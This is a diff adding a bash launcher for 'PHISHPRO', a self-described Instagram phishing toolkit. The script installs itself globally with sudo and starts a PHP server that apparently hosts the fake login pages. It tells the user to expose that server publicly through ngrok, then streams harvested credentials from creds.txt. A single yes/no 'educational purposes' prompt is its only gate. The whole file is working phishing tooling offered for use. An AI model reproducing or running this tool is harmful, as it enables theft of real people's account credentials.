@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# 🎨 Colors
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+NC='\033[0m' # reset
+
+# 🧠 Self-install (once)
+if [[ "$0" != "/usr/local/bin/phishpro" ]]; then
+  echo -e "${GREEN}[•] Installing PHISHPRO globally...${NC}"
+  if [[ $EUID -ne 0 ]]; then
+    echo -e "${RED}[!] Please run with sudo: sudo ./phishpro.sh${NC}"
+    exit 1
+  fi
+  cp "$0" /usr/local/bin/phishpro
+  chmod +x /usr/local/bin/phishpro
+  echo -e "${GREEN}[✓] Installed! Now just type: phishpro${NC}"
+  exit 0
+fi
+
+# ✅ BANNER
+clear
+echo -e "${GREEN}"
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║              🛡  PHISHPRO v1.0  —  by ZeshanAmin            ║"
+echo "║         Educational Instagram Phishing Toolkit             ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+# 🔒 Confirm educational use
+read -p "👉 Are you using this tool for educational purposes only? (yes/no): " confirm
+if [[ "$confirm" != "yes" ]]; then
+  echo -e "${RED}❌ Access denied.${NC}"; exit 1
+fi
+
+# ▶️ Start PHP server
+echo -e "\n📡 Starting PHP server on http://127.0.0.1:5000 ..."
+php -S 127.0.0.1:5000 > /dev/null 2>&1 &
+sleep 1
+
+echo -e "🌐 Start Ngrok manually using:"
+echo -e "${GREEN}   ngrok http 5000${NC}"
+
+
+# 📜 Tail logs
+echo -e "\n📜 Watching live credentials (creds.txt):\n"
+tail -f creds.txt
